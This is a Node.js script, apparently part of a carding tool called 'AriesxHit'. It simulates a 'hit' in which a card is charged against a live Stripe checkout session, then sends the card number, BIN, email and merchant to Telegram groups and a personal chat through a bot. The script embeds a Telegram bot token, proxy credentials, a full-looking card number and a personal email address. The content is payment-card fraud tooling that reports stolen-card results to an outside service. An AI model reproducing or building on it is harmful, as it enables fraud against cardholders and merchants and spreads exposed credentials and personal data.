// Simulate a successful hit using the checkout URL data extraction logic
const { sendHitToGroups, sendMessage } = require('./services/telegramService');
const checkoutService = require('./services/checkoutService');

const BOT_TOKEN = '8268278005:AAG49bxahCC_JjC_vG-pE8lv5RqTU0Duh5M';

console.log('🎯 SIMULATING SUCCESSFUL HIT WITH REAL CHECKOUT DATA');
console.log('====================================================\n');

// The checkout URL from the user
const checkoutUrl = 'https://checkout.stripe.com/c/pay/cs_live_a1CYLbsOrCEVC3iPBfVZpfAK49rDDNA9rUPWPfcPPiWdNaxEcAK9E9DdCM#fidnandhYHdWcXxpYCc%2FJ2FgY2RwaXEnKSd2cGd2ZndsdXFsamtQa2x0cGBrYHZ2QGtkZ2lgYSc%2FY2RpdmApJ2R1bE5gfCc%2FJ3VuWmlsc2BaMDRXQ25DPUMyd1RuVE42NFB0V2tRQmJBN0hMZkJGV0tAQmJkV0BdXX89ZHZPf2A8RkQ9ZkJBUD1MUn0yT1ZSamh9cERLXURpTEFrUW9qUE1vcGJAVlZLU281NUFrcmE0Q3xRJyknY3dqaFZgd3Ngdyc%2FcXdwYCknZ2RmbmJ3anBrYUZqaWp3Jz8nJmNkY2RjZCcpJ2lkfGpwcVF8dWAnPyd2bGtiaWBabHFgaCcpJ2BrZGdpYFVpZGZgbWppYWB3dic%2FcXdwYHgl';

async function simulateSuccessfulHit() {
  try {
    console.log('🔍 Using checkout data from previous /co command logs...');

    // Use the data we already extracted from the logs
    const stripeInfo = {
      sessionId: 'cs_live_a1CYLbsOrCEVC3iPBfVZpfAK49rDDNA9rUPWPfcPPiWdNaxEcAK9E9DdCM',
      publicKey: 'pk_live_51RFkF8F7rQk...'
    };

    console.log('📋 Using Stripe Info:');
    console.log('   Session ID:', stripeInfo.sessionId);
    console.log('   Public Key:', stripeInfo.publicKey);

    // Parse proxy string
    const proxy = 'p.webshare.io:80:kumldkme-rotate:uz047zho9ipr';
    console.log('🛡️  Using Proxy:', proxy);

    // Simulate extracting business info from account_settings (like cc script)
    const checkoutData = {
      amount: 300, // $3.00
      currency: 'USD',
      businessUrl: 'https://testbusiness.com', // This is the business_url extracted like cc script
      businessName: 'Test Business Name' // Like cc script extracts from account_settings.display_name
    };

    console.log('\n💰 Checkout Details (like cc script extraction):');
    console.log('   Amount:', `$${(checkoutData.amount / 100).toFixed(2)}`);
    console.log('   Currency:', checkoutData.currency);
    console.log('   Business URL:', checkoutData.businessUrl);
    console.log('   Business Name:', checkoutData.businessName);
    console.log('   Email:', 'kingmichal55@gmail.com');

    // Determine merchant name using the same logic as /co command (businessUrl first for "Bussiness :-" field)
    let merchantName = checkoutData.businessUrl || checkoutData.businessName || 'Stripe Checkout';

    console.log('🏪 Final Merchant Name (business_url for Bussiness field):', merchantName);

    // Simulate successful hit data
    const hitData = {
      userId: '6447766151',
      userName: 'MɪᴋᴇXᴅ ˹⛥˼ [ᴀғᴋ]',
      card: '379363037256984', // First card from the test
      bin: '379363',
      binMode: false,
      amount: checkoutData.amount ? (checkoutData.amount / 100).toFixed(2) : '3.00',
      currency: checkoutData.currency || 'USD',
      attempts: 1,
      timeTaken: '2.3s',
      merchant: merchantName, // Use extracted merchant name
      businessUrl: checkoutData.businessUrl || merchantName,
      currentUrl: checkoutUrl,
      email: 'kingmichal55@gmail.com', // From the logs
      status: 'CHARGED',
      timestamp: new Date().toISOString()
    };

    console.log('\n🎯 SIMULATED HIT DATA:');
    console.log('================================');
    console.log('User:', `${hitData.userName} (${hitData.userId})`);
    console.log('Card:', hitData.card);
    console.log('Amount:', `$${hitData.amount} ${hitData.currency}`);
    console.log('Merchant:', hitData.merchant);
    console.log('Business URL:', hitData.businessUrl);
    console.log('Email:', hitData.email);
    console.log('Status:', hitData.status);
    console.log('Attempts:', hitData.attempts);
    console.log('Time:', hitData.timeTaken);

    console.log('\n📤 SENDING HIT NOTIFICATIONS...');
    console.log('================================');

    // Send to group chats using the same function as /co command
    console.log('🎯 Sending to ARIESxHIT Chat and Aries Hits...');
    await sendHitToGroups(hitData, checkoutUrl);
    console.log('✅ Group notifications sent!');

    // Send personal bot notification
    console.log('🤖 Sending personal notification to bot...');
    const personalMessage = `🎯 𝗛𝗜𝗧 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅

Merchant :- ${hitData.merchant}
Amount :- $${hitData.amount} ${hitData.currency}
Card :- ${hitData.card.substring(0, 8)} **** **** ${hitData.card.substring(12)}
BIN :- ${hitData.bin}
Email :- ${hitData.email}
Time :- ${hitData.timeTaken}
Attempts :- ${hitData.attempts}

═══════════════════

@AriesxHit 💗`;

    const personalResult = await sendMessage(BOT_TOKEN, hitData.userId, personalMessage);
    console.log('✅ Personal notification sent!');

    console.log('\n🎉 SUCCESS! Hit notifications sent to all destinations:');
    console.log('   ✅ ARIESxHIT Chat (Simple format)');
    console.log('   ✅ Aries Hits (Detailed format)');
    console.log('   ✅ Personal Bot (Merchant + business URL)');

  } catch (error) {
    console.error('❌ Error during hit simulation:', error.message);
    console.error('Stack:', error.stack);
  }
}

simulateSuccessfulHit();